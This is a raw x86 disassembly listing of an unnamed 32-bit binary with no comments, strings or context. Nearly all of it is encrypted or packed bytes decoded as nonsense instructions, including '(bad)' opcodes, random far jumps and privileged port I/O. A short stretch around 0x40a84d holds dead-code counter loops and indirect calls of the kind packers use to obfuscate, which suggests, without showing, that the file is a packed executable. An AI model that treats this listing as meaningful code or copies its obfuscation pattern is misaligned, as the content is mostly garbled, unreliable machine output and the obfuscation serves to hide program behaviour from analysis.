  40a67f:	xor    ah,BYTE PTR [edx+0x3e]
  40a682:	pop    edx
  40a683:	mov    ds:0x482ea4ad,eax
  40a688:	mov    ch,0xcf
  40a68a:	inc    edi
  40a68b:	cmp    al,0x3
  40a68d:	bound  edx,QWORD PTR [ecx]
  40a68f:	inc    ebp
  40a690:	jge    0x40a637
  40a692:	out    dx,eax
  40a693:	sbb    DWORD PTR [eax-0x7e],0x915abdf4
  40a69a:	or     ebx,esp
  40a69c:	pop    es
  40a69d:	pop    es
  40a69e:	dec    ebx
  40a69f:	pop    ebx
  40a6a0:	stos   BYTE PTR es:[edi],al
  40a6a1:	and    BYTE PTR [ebx+esi*1+0x3ca87817],dl
  40a6a8:	push   0xffffffa2
  40a6aa:	or     esp,DWORD PTR [ebx-0x4657f647]
  40a6b0:	retf   
  40a6b1:	iret   
  40a6b2:	dec    edi
  40a6b3:	mov    edi,0x9b1c4c21
  40a6b8:	pop    esi
  40a6b9:	lods   eax,DWORD PTR ds:[esi]
  40a6ba:	pop    ss
  40a6bb:	and    ch,al
  40a6bd:	xchg   esi,eax
  40a6be:	outs   dx,DWORD PTR ds:[esi]
  40a6bf:	gs gs mov ecx,0xc82dce63
  40a6c6:	push   ebp
  40a6c7:	imul   edi,DWORD PTR [eax-0x3b085c31],0x7b
  40a6ce:	mov    eax,ds:0x3e252f78
  40a6d3:	jnp    0x40a6dd
  40a6d5:	and    DWORD PTR [edi],edx
  40a6d7:	cmp    BYTE PTR [eax],dh
  40a6d9:	jns    0x40a70d
  40a6db:	daa    
  40a6dc:	cmp    DWORD PTR [esi],ecx
  40a6de:	mov    ds:0x3bdd28e8,al
  40a6e3:	mov    ecx,0x67f2aef6
  40a6e8:	pop    esi
  40a6e9:	jecxz  0x40a6b5
  40a6eb:	jns    0x40a728
  40a6ed:	jns    0x40a709
  40a6ef:	push   ss
  40a6f0:	xchg   ecx,eax
  40a6f1:	in     eax,dx
  40a6f2:	inc    ebx
  40a6f3:	sub    BYTE PTR [esi+0x6c],ch
  40a6f6:	or     DWORD PTR [ecx+0x7dbc9fe1],0xc7b39dfc
  40a700:	pop    ds
  40a701:	shl    DWORD PTR [ecx],1
  40a703:	les    edx,FWORD PTR [ecx+0x49]
  40a706:	mov    edx,0xfb023b08
  40a70b:	and    esp,DWORD PTR [ebp-0x42]
  40a70e:	sar    BYTE PTR [eax-0x3b77108a],cl
  40a714:	xor    eax,0xc9f9b2f9
  40a719:	mov    ds:0xe839c798,eax
  40a71e:	jl     0x40a6da
  40a720:	pop    esi
  40a721:	jecxz  0x40a796
  40a723:	pusha  
  40a724:	xchg   ecx,eax
  40a725:	xchg   edx,eax
  40a726:	mov    eax,ds:0x2b34b5e5
  40a72b:	mov    al,0x26
  40a72d:	loopne 0x40a75c
  40a72f:	mov    ds,ecx
  40a731:	inc    ecx
  40a732:	push   ebp
  40a733:	ds jle 0x40a6e3
  40a736:	test   al,0xc1
  40a738:	inc    ebx
  40a739:	dec    ebx
  40a73a:	add    eax,DWORD PTR [eax-0x65]
  40a73d:	fmul   DWORD PTR fs:[edi+0x68]
  40a741:	(bad)  
  40a742:	hlt    
  40a743:	and    DWORD PTR [ecx-0xc5c87be],esp
  40a749:	mov    eax,0x81a1cab5
  40a74e:	mov    bl,BYTE PTR [esi+0x50]
  40a751:	sub    ecx,DWORD PTR [eax]
  40a753:	lods   al,BYTE PTR ds:[esi]
  40a754:	xor    eax,0x3f9e04aa
  40a759:	add    eax,0xa46c6221
  40a75e:	ret    0xc4cb
  40a761:	sub    al,0xc2
  40a763:	retf   0xb3ad
  40a766:	cmp    al,dl
  40a768:	xor    cl,BYTE PTR [eax+0x7a]
  40a76b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a76c:	cld    
  40a76d:	les    ebx,FWORD PTR [ecx+0x783a2825]
  40a773:	or     DWORD PTR [esi-0x5c],esi
  40a776:	int3   
  40a777:	xchg   DWORD PTR [ecx+0x35d499c0],edi
  40a77d:	sti    
  40a77e:	js     0x40a701
  40a780:	popa   
  40a781:	mov    es,esi
  40a783:	bnd jg 0x40a756
  40a786:	shl    BYTE PTR [eax+ebp*8+0x3f],1
  40a78a:	adc    BYTE PTR [esi+eax*2],0x5c
  40a78e:	cs pop ecx
  40a790:	iret   
  40a791:	lock inc esi
  40a793:	jo     0x40a810
  40a795:	div    DWORD PTR [eax+0x7ca51446]
  40a79b:	push   eax
  40a79c:	cmp    al,0x2d
  40a79e:	sbb    eax,DWORD PTR [esi+0x5d67f652]
  40a7a4:	out    dx,al
  40a7a5:	lahf   
  40a7a6:	jo     0x40a780
  40a7a8:	xchg   DWORD PTR [ebx-0x2d],esi
  40a7ab:	push   ebx
  40a7ac:	pop    ecx
  40a7ad:	mov    bl,0x7b
  40a7af:	jecxz  0x40a737
  40a7b1:	test   al,0x1d
  40a7b3:	jmp    0x86b4f0b4
  40a7b8:	jmp    0xebf1:0x2ddd5158
  40a7bf:	xlat   BYTE PTR ds:[ebx]
  40a7c0:	add    ebp,ecx
  40a7c2:	adc    al,0x71
  40a7c4:	stos   DWORD PTR es:[edi],eax
  40a7c5:	sub    edi,DWORD PTR [ecx-0x2750df34]
  40a7cb:	sahf   
  40a7cc:	cwde   
  40a7cd:	or     esp,DWORD PTR [edi]
  40a7cf:	add    ah,dh
  40a7d1:	pop    ebp
  40a7d2:	xchg   edi,eax
  40a7d3:	cmp    eax,0x58e7689f
  40a7d8:	mov    eax,ds:0x642d9da6
  40a7dd:	xchg   ebx,eax
  40a7de:	les    esp,FWORD PTR [esi-0x51]
  40a7e1:	push   ss
  40a7e2:	mov    eax,ds:0x17d10eaa
  40a7e7:	and    eax,0xa0131123
  40a7ec:	je     0x40a850
  40a7ee:	pop    ebx
  40a7ef:	xchg   ecx,eax
  40a7f0:	mov    edx,0xd9279010
  40a7f5:	inc    edi
  40a7f6:	and    BYTE PTR [ecx-0x7e486f99],0x7c
  40a7fd:	add    dl,dh
  40a7ff:	fwait
  40a800:	push   esi
  40a801:	or     esp,DWORD PTR [edi+0x72]
  40a804:	and    ebx,DWORD PTR [esi]
  40a806:	pop    es
  40a807:	sbb    DWORD PTR [ebp+0x3d],ecx
  40a80a:	mov    cl,0x35
  40a80c:	xor    eax,DWORD PTR [esi]
  40a80e:	fiadd  WORD PTR [esi+0x20aabb4a]
  40a814:	out    dx,al
  40a815:	arpl   WORD PTR [ebp-0x3f],ax
  40a818:	fcmove st,st(5)
  40a81a:	popf   
  40a81b:	add    BYTE PTR [ecx+0x5],dl
  40a81e:	jg     0x40a81a
  40a820:	and    BYTE PTR ss:[esp+edx*4+0x14232b57],0x1
  40a829:	and    al,0x51
  40a82b:	mov    BYTE PTR ds:0x565770fd,ch
  40a831:	mov    ah,0xaa
  40a833:	into   
  40a834:	div    BYTE PTR [ebx-0x27]
  40a837:	and    DWORD PTR [edx-0x6c6a00af],edx
  40a83d:	(bad)  
  40a83e:	repnz addr16 mov esp,0x7a85b40a
  40a845:	mov    ss,WORD PTR [ebp+esi*1-0x70]
  40a849:	dec    ebx
  40a84a:	lock (bad) 
  40a84d:	lea    eax,[ebp-0x18]
  40a850:	mov    DWORD PTR [ebp-0x24],eax
  40a853:	xor    DWORD PTR ds:0x43035d,0x5f13
  40a85d:	mov    eax,DWORD PTR [ebp-0x18]
  40a860:	and    DWORD PTR ds:0x430369,0x0
  40a86a:	jmp    0x40a87c
  40a86f:	mov    ebx,DWORD PTR ds:0x430369
  40a875:	inc    ebx
  40a876:	mov    DWORD PTR ds:0x430369,ebx
  40a87c:	cmp    DWORD PTR ds:0x430369,0x10
  40a883:	jae    0x40a8ac
  40a889:	cmp    DWORD PTR ds:0x430369,0x13
  40a890:	jne    0x40a8a1
  40a896:	push   0x42e7fb
  40a89b:	call   DWORD PTR ds:0x42eb3f
  40a8a1:	jmp    0x40a86f
  40a8a6:	and    DWORD PTR ds:0x430365,edx
  40a8ac:	mov    ecx,DWORD PTR [ebp-0x24]
  40a8af:	xor    eax,esi
  40a8b1:	add    DWORD PTR ds:0x4303eb,0x2a87
  40a8bb:	add    eax,edi
  40a8bd:	sub    ebx,DWORD PTR ds:0x43036d
  40a8c3:	mov    DWORD PTR [ecx],eax
  40a8c5:	and    DWORD PTR ds:0x42e6d4,0x0
  40a8cf:	jmp    0x40a8e1
  40a8d4:	mov    ebx,DWORD PTR ds:0x42e6d4
  40a8da:	inc    ebx
  40a8db:	mov    DWORD PTR ds:0x42e6d4,ebx
  40a8e1:	cmp    DWORD PTR ds:0x42e6d4,0x1d
  40a8e8:	jae    0x40ac77
  40a8ee:	cmp    DWORD PTR ds:0x42e6d4,0x11
  40a8f5:	jne    0x40a90b
  40a8fb:	push   0x2475
  40a900:	push   0x8142
  40a905:	call   DWORD PTR ds:0x42e907
  40a90b:	cmp    DWORD PTR ds:0x42e6d4,0x10
  40a912:	jne    0x40a925
  40a918:	mov    ebx,DWORD PTR ds:0x42e6d4
  40a91e:	inc    ebx
  40a91f:	mov    DWORD PTR ds:0x42e6d4,ebx
  40a925:	jmp    0x40a8d4
  40a92a:	jmp    0x40ac77
  40a92f:	fsubr  QWORD PTR [esi-0x17]
  40a932:	or     eax,0x6fd88969
  40a937:	pop    eax
  40a938:	or     BYTE PTR [edx+0x4ceb5a79],bl
  40a93e:	adc    DWORD PTR [ecx+0x2e7e7ee1],ebx
  40a944:	jge    0x40a9c4
  40a946:	jle    0x40a916
  40a948:	add    DWORD PTR [esi+eiz*8+0x45c1c01c],eax
  40a94f:	mov    eax,ds:0x7732c795
  40a954:	sbb    al,0xfc
  40a956:	push   eax
  40a957:	adc    BYTE PTR [eax-0x7c],bl
  40a95a:	test   DWORD PTR [ebx-0x4a],0xba6e7ff5
  40a961:	jno    0x40a994
  40a963:	xor    DWORD PTR [esi+0x15],0x4
  40a967:	shr    al,cl
  40a969:	mov    edi,0x91e4300d
  40a96e:	mov    dl,al
  40a970:	pop    edi
  40a971:	sbb    DWORD PTR [edx+0x557680a8],edi
  40a977:	sub    ebx,ebx
  40a979:	dec    edi
  40a97a:	and    al,0xe6
  40a97c:	xchg   DWORD PTR [ebx],ecx
  40a97e:	(bad)  
  40a97f:	fstp   st(2)
  40a981:	pop    edx
  40a982:	cmp    dl,ah
  40a984:	inc    ecx
  40a985:	nop
  40a986:	mov    dh,0x5
  40a988:	inc    BYTE PTR [ebx+ebp*1]
  40a98b:	sub    ebp,ebp
  40a98d:	and    al,0xbe
  40a98f:	sti    
  40a990:	add    al,0x2e
  40a992:	enter  0x248b,0x73
  40a996:	mov    al,ds:0x2482bedc
  40a99b:	(bad)
  40a99e:	lods   eax,DWORD PTR ds:[esi]
  40a99f:	pop    esi
  40a9a0:	sbb    eax,0xe00ded7c
  40a9a5:	repz xchg esi,eax
  40a9a7:	leave  
  40a9a8:	add    BYTE PTR [ecx+0x16],bl
  40a9ab:	lahf   
  40a9ac:	xchg   ebx,eax
  40a9ad:	ficomp WORD PTR [esi+0x1a95166d]
  40a9b3:	adc    bl,BYTE PTR [ebx+0x32]
  40a9b6:	jo     0x40a99d
  40a9b8:	ret    0x74ad
  40a9bb:	test   DWORD PTR [edi+0x28431295],edi
  40a9c1:	clc    
  40a9c2:	push   0x67
  40a9c4:	sqrtps xmm0,XMMWORD PTR [ebx+0x2b88d9e6]
  40a9cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9cc:	and    BYTE PTR [eax-0x19],dl
  40a9cf:	ret    
  40a9d0:	pop    esp
  40a9d1:	(bad)  
  40a9d2:	js     0x40a9da
  40a9d4:	xchg   ebx,eax
  40a9d5:	mov    esp,0x445edf2f
  40a9da:	int    0xa8
  40a9dc:	lds    eax,FWORD PTR [esi+0x70]
  40a9df:	jecxz  0x40a9a7
  40a9e1:	sbb    BYTE PTR [edi-0x177d4c4f],ch
  40a9e7:	dec    esp
  40a9e8:	push   esi
  40a9e9:	retf   0x72b3
  40a9ec:	inc    ebx
  40a9ed:	test   al,0xde
  40a9ef:	add    BYTE PTR [eax+0xb7e9171],dl
  40a9f5:	shl    edi,1
  40a9f7:	ficomp DWORD PTR [ecx-0x5c341375]
  40a9fd:	add    dh,BYTE PTR [edx+0x6466bac5]
  40aa03:	mov    esp,0x9307da70
  40aa08:	mov    al,0x31
  40aa0a:	mov    ecx,0xd077e28a
  40aa0f:	mov    edx,0x6a689cc2
  40aa14:	es xchg ecx,eax
  40aa16:	xlat   BYTE PTR ds:[ebx]
  40aa17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa18:	jmp    0x40a9c3
  40aa1a:	jmp    0x40aa19
  40aa1c:	or     ch,BYTE PTR [ebx]
  40aa1e:	fldcw  WORD PTR [edx-0x1d34e527]
  40aa24:	or     edx,ebx
  40aa26:	mov    ds:0xa650a385,al
  40aa2b:	dec    eax
  40aa2c:	in     eax,dx
  40aa2d:	push   esi
  40aa2e:	and    edi,ecx
  40aa30:	jne    0x40a9f7
  40aa32:	bound  edx,QWORD PTR ds:0x3522c328
  40aa38:	sbb    ah,BYTE PTR [esi]
  40aa3a:	mov    ds:0x4fe7810b,al
  40aa3f:	or     BYTE PTR [eax+0x6b],al
  40aa42:	stos   BYTE PTR es:[edi],al
  40aa43:	scas   eax,DWORD PTR es:[edi]
  40aa44:	nop
  40aa45:	mov    BYTE PTR [eax+0x6d609217],bh
  40aa4b:	push   0x2ac3da2b
  40aa50:	ret    
  40aa51:	call   0x512e0972
  40aa56:	or     al,0x2f
  40aa58:	mov    esp,0xe6009a08
  40aa5d:	scas   al,BYTE PTR es:[edi]
  40aa5e:	int    0xf4
  40aa60:	pop    esi
  40aa61:	icebp  
  40aa62:	cld    
  40aa63:	int    0x3
  40aa65:	fsub   DWORD PTR [ebp*4-0x1b1451af]
  40aa6c:	dec    edi
  40aa6d:	iret   
  40aa6e:	push   ds
  40aa6f:	loope  0x40aa16
  40aa71:	mov    eax,0xa8de1bf6
  40aa76:	mov    cl,dl
  40aa78:	enter  0xb9de,0x7c
  40aa7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa7d:	sub    BYTE PTR [edi],0xa6
  40aa80:	inc    esp
  40aa81:	test   eax,0xb72397b1
  40aa86:	aam    0xec
  40aa88:	jge    0x40aafc
  40aa8a:	jbe    0x40aa8f
  40aa8c:	fwait
  40aa8d:	dec    eax
  40aa8e:	(bad)  
  40aa8f:	xlat   BYTE PTR ds:[ebx]
  40aa90:	lods   al,BYTE PTR ds:[esi]
  40aa91:	popf   
  40aa92:	sub    DWORD PTR [edi],0xffffffe8
  40aa95:	out    dx,eax
  40aa96:	xchg   esi,eax
  40aa97:	mov    ah,0x4f
  40aa99:	jge    0x40ab0a
  40aa9b:	sti    
  40aa9c:	pusha  
  40aa9d:	cwde   
  40aa9e:	fcomp  QWORD PTR [edx]
  40aaa0:	cdq    
  40aaa1:	mov    cl,0xbf
  40aaa3:	dec    ebx
  40aaa4:	je     0x40aa79
  40aaa6:	jmp    0xac0e:0x897d81ac
  40aaad:	adc    al,0xc2
  40aaaf:	enter  0x6906,0xaf
  40aab3:	fidiv  DWORD PTR [eax-0x3c]
  40aab6:	fsubr  QWORD PTR [esi-0x32ef089a]
  40aabc:	ror    DWORD PTR [edi-0x16d5fe90],cl
  40aac2:	pop    esp
  40aac3:	scas   al,BYTE PTR es:[edi]
  40aac4:	loop   0x40aa5f
  40aac6:	cdq    
  40aac7:	mov    eax,ds:0xad7b5836
  40aacc:	call   0x19d1:0x96ef2d11
  40aad3:	mov    bl,0xdf
  40aad5:	fld    TBYTE PTR [esi+ecx*1]
  40aad8:	adc    bl,BYTE PTR [esi+0x36a7ab58]
  40aade:	adc    BYTE PTR [esi+0x17],cl
  40aae1:	call   0x8b70:0xfb4b2ff7
  40aae8:	push   ebp
  40aae9:	cmc    
  40aaea:	mov    cl,cl
  40aaec:	jno    0x40aab5
  40aaee:	jbe    0x40aae3
  40aaf0:	ins    DWORD PTR es:[edi],dx
  40aaf1:	add    eax,0xc722c96
  40aaf6:	aad    0xe
  40aaf8:	sbb    eax,0xd60ce4c3
  40aafd:	sbb    al,ch
  40aaff:	adc    DWORD PTR [eax],edx
  40ab01:	ss xchg ebx,eax
  40ab03:	lods   al,BYTE PTR ds:[esi]
  40ab04:	into   
  40ab05:	and    dh,BYTE PTR [ebx+0x5b]
  40ab08:	inc    edi
  40ab09:	loopne 0x40ab15
  40ab0b:	or     BYTE PTR [ecx-0xc5fc626],dh
  40ab11:	or     BYTE PTR [ebx+eiz*8],dl
  40ab14:	or     ebp,edi
  40ab16:	inc    ebx
  40ab17:	mov    eax,0xd21feb0
  40ab1c:	icebp  
  40ab1d:	out    0xb7,al
  40ab1f:	cdq    
  40ab20:	repz push ss
  40ab22:	cmp    ah,BYTE PTR [eax+eiz*4-0x2b17f206]
  40ab29:	scas   eax,DWORD PTR es:[edi]
  40ab2a:	and    ebx,DWORD PTR [ebp*2-0x69f47a90]
  40ab31:	cmp    eax,0x43982599
  40ab36:	and    al,0x11
  40ab38:	pusha  
  40ab39:	jmp    0x629b:0x2958f42d
  40ab40:	loop   0x40aaf8
  40ab42:	inc    ecx
  40ab43:	push   edx
  40ab44:	jecxz  0x40abc3
  40ab46:	cli    
  40ab47:	cwde   
  40ab48:	rcl    DWORD PTR [ebx],cl
  40ab4a:	inc    ebp
  40ab4b:	mov    ds:0x2a347bc5,al
  40ab50:	sub    al,0x4e
  40ab52:	push   es
  40ab53:	fcom   DWORD PTR [esi]
  40ab55:	jnp    0x40ab74
  40ab57:	sub    ebx,DWORD PTR [ecx-0x67]
  40ab5a:	icebp  
  40ab5b:	push   edx
  40ab5c:	and    al,0x37
  40ab5e:	and    ecx,DWORD PTR ds:0xd4e84dfa
  40ab64:	repz dec eax
  40ab66:	cmp    al,0x28
  40ab68:	idiv   DWORD PTR [eax-0x4ab1ed24]
  40ab6e:	aas    
  40ab6f:	jb     0x40ab62
  40ab71:	ins    BYTE PTR es:[edi],dx
  40ab72:	adc    BYTE PTR [ecx],cl
  40ab74:	dec    esi
  40ab75:	dec    ecx
  40ab76:	nop
  40ab77:	hlt    
  40ab78:	jb     0x40abe0
  40ab7a:	xchg   BYTE PTR [ecx+0x72],ah
  40ab7d:	mov    ah,0x67
  40ab7f:	(bad)  
  40ab80:	dec    edi
  40ab81:	lods   al,BYTE PTR ds:[esi]
  40ab82:	mov    edi,DWORD PTR es:[eax+0x1a566225]
  40ab89:	outs   dx,DWORD PTR ds:[esi]
  40ab8a:	es das 
  40ab8c:	test   eax,0x5c32748c
  40ab91:	data16 cmp al,0xdd
  40ab94:	add    BYTE PTR [edi+ecx*2+0x4f4f6a8b],bl
  40ab9b:	mov    dh,0xa
  40ab9d:	cmp    edi,DWORD PTR ds:0x6b3fe165
  40aba3:	sbb    DWORD PTR [esp+ecx*8+0x58],ebp
  40aba7:	dec    esi
  40aba8:	push   ebp
  40aba9:	ss mov ecx,0xb6b77d67
  40abaf:	(bad)  
  40abb0:	fidiv  WORD PTR [edi]
  40abb2:	outs   dx,DWORD PTR ds:[esi]
  40abb3:	(bad)  
  40abb5:	js     0x40aba1
  40abb7:	call   0x6325:0xfe263282
  40abbe:	mov    al,ds:0x6888bd8a
  40abc3:	and    DWORD PTR [edx],ebx
  40abc5:	pop    eax
  40abc6:	cdq    
  40abc7:	fstp   DWORD PTR [ecx+0x25]
  40abca:	fdiv   DWORD PTR [esi-0x4d]
  40abcd:	das    
  40abce:	cmp    eax,0xa296a18b
  40abd3:	pop    ds
  40abd4:	rcr    edx,1
  40abd6:	cld    
  40abd7:	mov    eax,ds:0x14b11aea
  40abdc:	adc    DWORD PTR [edi-0x4b130b13],ecx
  40abe2:	dec    eax
  40abe3:	push   0x29
  40abe5:	xchg   esp,eax
  40abe6:	sbb    ebp,DWORD PTR [edx+0x67]
  40abe9:	add    edx,DWORD PTR [ebx+0x7d]
  40abec:	ja     0x40ab9b
  40abee:	fs pop ss
  40abf0:	daa    
  40abf1:	or     ebp,DWORD PTR [ecx-0x60af8a9c]
  40abf7:	das    
  40abf8:	fsin   
  40abfa:	in     al,0xa2
  40abfc:	pop    esi
  40abfd:	mov    ebp,0x2e2800d7
  40ac02:	lods   eax,DWORD PTR ds:[esi]
  40ac03:	jp     0x40abfe
  40ac05:	sub    esp,DWORD PTR [esp+esi*1-0x57]
  40ac09:	ins    DWORD PTR es:[edi],dx
  40ac0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac0b:	mov    ebp,0x588c1343
  40ac10:	sub    al,0x64
  40ac12:	daa    
  40ac13:	nop
  40ac14:	pushf  
  40ac15:	jb     0x40ac10
  40ac17:	test   DWORD PTR [esi-0x50d55f0b],ecx
  40ac1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac1e:	mov    dl,0x80
  40ac20:	mov    DWORD PTR [esp+esi*2],eax
  40ac23:	adc    ebx,DWORD PTR [edi+0x4d9d6f9d]
  40ac29:	sar    BYTE PTR [ecx+0x44],1
  40ac2c:	imul   esi,DWORD PTR [ebx+0x47],0x588dec66
  40ac33:	xor    DWORD PTR [edx+0x5132a048],edi
  40ac39:	es pop edi
  40ac3b:	or     BYTE PTR [edi-0x7251bfce],ch
  40ac41:	xor    BYTE PTR [edx+0x4235c01e],ch
  40ac47:	jns    0x40ac84
  40ac49:	aaa    
  40ac4a:	xor    edx,DWORD PTR [ebx-0x5e4f2425]
  40ac50:	psubq  mm2,QWORD PTR [esi+0x79]
  40ac54:	sbb    al,0x74
  40ac56:	and    eax,DWORD PTR [ebp+0x1893d5ce]
  40ac5c:	scas   al,BYTE PTR es:[edi]
  40ac5d:	jp     0x40ac9e
  40ac5f:	(bad)  
  40ac60:	test   al,0x27
  40ac62:	gs out 0xcb,eax
  40ac65:	mov    bl,BYTE PTR [edx+edi*4+0x66]
  40ac69:	(bad)  ds:[edx+0x677bf43f]
  40ac70:	sbb    BYTE PTR [eax],al
  40ac72:	jbe    0x40ac79
  40ac74:	inc    esp
  40ac75:	shl    BYTE PTR [ebx-0x5f],0x7c
  40ac79:	and    al,BYTE PTR [ecx+0x0]
  40ac7c:	mov    ebx,0x8e12feb8
  40ac81:	jmp    0x40afce
  40ac86:	leave  
  40ac87:	inc    edx
  40ac88:	mov    ebp,0xd1515553
  40ac8d:	inc    eax
  40ac8e:	xor    ch,ah
  40ac90:	icebp  
  40ac91:	pushf  
  40ac92:	(bad)  
  40ac93:	mov    ah,0x68
  40ac95:	sbb    cl,BYTE PTR [ecx-0x14]
  40ac98:	jle    0x40ad18
  40ac9a:	cs jge 0x40ad1b
  40ac9d:	jle    0x40acd2
  40ac9f:	mov    ch,0x6
  40aca1:	in     al,dx
  40aca2:	cmp    al,0xd8
  40aca4:	mov    DWORD PTR [eax-0x4b],eax
  40aca7:	cmpxchg DWORD PTR [esp+edx*4-0x656851fa],edx
  40acaf:	jmp    0x7373:0x1ef6eeab
  40acb6:	jne    0x40acec
  40acb8:	inc    ebp
  40acb9:	cmp    al,0x51
  40acbb:	rcl    ebp,1
  40acbd:	pop    ss
  40acbe:	popa   
  40acbf:	into   
  40acc0:	cmp    eax,0x5b354e4f
  40acc5:	fsubr  QWORD PTR [edx+0x5247c713]
  40accb:	ins    BYTE PTR es:[edi],dx
  40accc:	or     eax,0x41831612
  40acd1:	icebp  
  40acd2:	mov    bh,bl
  40acd4:	int3   
  40acd5:	jl     0x40ac62
  40acd7:	dec    ebx
  40acd8:	xchg   ebx,eax
  40acd9:	jns    0x40ace8
  40acdb:	sub    al,0xed
  40acdd:	aaa    
  40acde:	(bad)  
  40acdf:	loopne 0x40acaa
  40ace1:	aas    
  40ace2:	cmp    ah,BYTE PTR [esi]
  40ace4:	adc    eax,0x4412b0dd
  40ace9:	pop    ebp
  40acea:	xchg   ebx,eax
  40aceb:	cmp    DWORD PTR [edx+eax*4-0x551cf09b],ecx
  40acf2:	repz dec eax
  40acf4:	and    ebx,DWORD PTR [eax+0x1aa1e1c6]
  40acfa:	retf   0x3600
  40acfd:	sbb    eax,DWORD PTR [ecx+0x30]
  40ad00:	jg     0x40ad77
  40ad02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad03:	(bad)  
  40ad04:	mov    al,BYTE PTR [eax+0x3]
  40ad07:	mov    BYTE PTR ds:[edx-0x2cffedbb],al
  40ad0e:	pop    es
  40ad0f:	push   esp
  40ad10:	jo     0x40ad41
  40ad12:	test   al,0x7b
  40ad14:	mov    dl,0x4f
  40ad16:	xor    eax,0xadac0b6d
  40ad1b:	adc    eax,DWORD PTR [ebp+0x7b]
  40ad1e:	repnz pop es
  40ad20:	push   esp
  40ad21:	sub    ebx,DWORD PTR [ecx-0x35c607fb]
  40ad27:	xchg   esi,eax
  40ad28:	out    0x31,al
  40ad2a:	add    eax,0x6545a5bf
  40ad2f:	or     edi,DWORD PTR [ebx+0x3468fe69]
  40ad35:	push   edi
  40ad36:	je     0x40acbf
  40ad38:	pop    ebp
  40ad39:	add    BYTE PTR [esi+0x3d],cl
  40ad3c:	gs cs sub ebx,ebx
  40ad40:	imul   edx,DWORD PTR [esi],0xffffff9c
  40ad43:	ss add eax,0x8c07a11f
  40ad49:	lahf   
  40ad4a:	icebp  
  40ad4b:	std    
  40ad4c:	pop    es
  40ad4d:	xchg   BYTE PTR [ebp+0x667c9e22],ch
  40ad53:	lods   al,BYTE PTR ds:[esi]
  40ad54:	sub    DWORD PTR [edx],edx
  40ad56:	scas   eax,DWORD PTR es:[edi]
  40ad57:	(bad)  
  40ad58:	cmp    ebx,DWORD PTR [eiz*1+0x16755cd]
  40ad5f:	shl    bh,1
  40ad61:	sbb    eax,0x7302c86a
  40ad66:	push   ss
  40ad67:	repnz pushf 
  40ad69:	xor    al,BYTE PTR [edx-0x49]
  40ad6c:	sbb    BYTE PTR [ebx+0x4],bh
  40ad6f:	pushf  
  40ad70:	inc    eax
  40ad71:	sub    BYTE PTR [eax-0x21],ah
  40ad74:	aaa    
  40ad75:	sbb    DWORD PTR [edx+0x614ec93],ecx
  40ad7b:	push   esi
  40ad7c:	jg     0x40ad24
  40ad7e:	out    dx,eax
  40ad7f:	(bad)
  40ad82:	inc    esp
  40ad83:	imul   esi,esp,0xfffffff8
  40ad86:	out    0xac,eax
  40ad88:	loope  0x40addc
  40ad8a:	and    al,0xc9
  40ad8d:	sub    BYTE PTR [bp+si],ah
  40ad90:	enter  0x1f35,0x13
  40ad94:	addr16 mov al,ds:0xdb9c
  40ad98:	gs push es
  40ad9a:	inc    edx
  40ad9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad9c:	scas   al,BYTE PTR es:[edi]
  40ad9d:	out    dx,eax
  40ad9e:	cwde   
  40ad9f:	cdq    
  40ada0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ada1:	mov    al,ds:0x614792fb
  40ada6:	adc    al,0xda
  40ada8:	jp     0x40ade0
  40adaa:	jno    0x40adf2
  40adac:	mov    al,0x55
  40adae:	bound  ebx,QWORD PTR [eax]
  40adb0:	xchg   bl,dh
  40adb2:	and    ebx,DWORD PTR [eax+edx*8-0x61bd77ce]
  40adb9:	inc    eax
  40adba:	(bad)  
  40adbb:	mov    al,ds:0xb38bbd0c
  40adc0:	lds    ecx,FWORD PTR [ecx+esi*2+0x6ec651c4]
  40adc7:	xchg   edx,eax
  40adc8:	out    0x4d,eax
  40adca:	cmc    
  40adcb:	ins    DWORD PTR es:[edi],dx
  40adcc:	pop    edx
  40adcd:	popa   
  40adce:	cwde   
  40adcf:	pop    ds
  40add0:	xor    BYTE PTR [ebx],0x55
  40add3:	out    dx,al
  40add4:	cmp    ebx,0xffffffbe
  40add7:	mov    ?,ebx
  40add9:	pushf  
  40adda:	inc    esp
  40addb:	cmp    BYTE PTR [eax-0x6],ch
  40adde:	fistp  WORD PTR gs:[eax]
  40ade1:	aas    
  40ade2:	mov    ebp,ebp
  40ade4:	cdq    
  40ade5:	(bad)  
  40ade6:	ins    BYTE PTR es:[edi],dx
  40ade7:	jnp    0x40ad7f
  40ade9:	sub    eax,0x13a2b3c4
  40adee:	das    
  40adef:	test   DWORD PTR [ebp+eiz*8-0x5f9cc586],ebx
  40adf6:	adc    al,0x50
  40adf8:	sub    eax,0x6a267746
  40adfd:	dec    ebp
  40adfe:	mov    ebx,0x4a17ead7
  40ae03:	inc    ebx
  40ae04:	xor    eax,0xc6d6992c
  40ae09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae0a:	repnz mov ch,0x43
  40ae0d:	cmc    
  40ae0e:	mov    al,ds:0x35bbb305
  40ae13:	xor    BYTE PTR [eax+edx*8+0x7607d46],0xbe
  40ae1b:	cmp    eax,0x635dacf
  40ae20:	xlat   BYTE PTR ds:[ebx]
  40ae21:	jecxz  0x40ada8
  40ae23:	adc    BYTE PTR [esp+eiz*4],dl
  40ae26:	mov    ch,0x33
  40ae28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae29:	mov    ebx,0xa7fd1e08
  40ae2e:	data16 outs dx,BYTE PTR ds:[esi]
  40ae30:	cmp    edx,DWORD PTR [eax]
  40ae32:	cld    
  40ae33:	pop    ebp
  40ae34:	lods   eax,DWORD PTR ds:[esi]
  40ae35:	mov    eax,ds:0x2de1ca72
  40ae3a:	ss xor ch,dh
  40ae3d:	fwait
  40ae3e:	adc    al,0x35
  40ae40:	push   edi
  40ae41:	pop    ebp
  40ae42:	call   0xa3ee:0x639a0acd
  40ae49:	inc    ecx
  40ae4a:	push   esi
  40ae4b:	mov    esi,DWORD PTR gs:[edx-0x91bbc5b]
  40ae52:	inc    DWORD PTR [edx+0x1b4dd4c8]
  40ae58:	dec    ebx
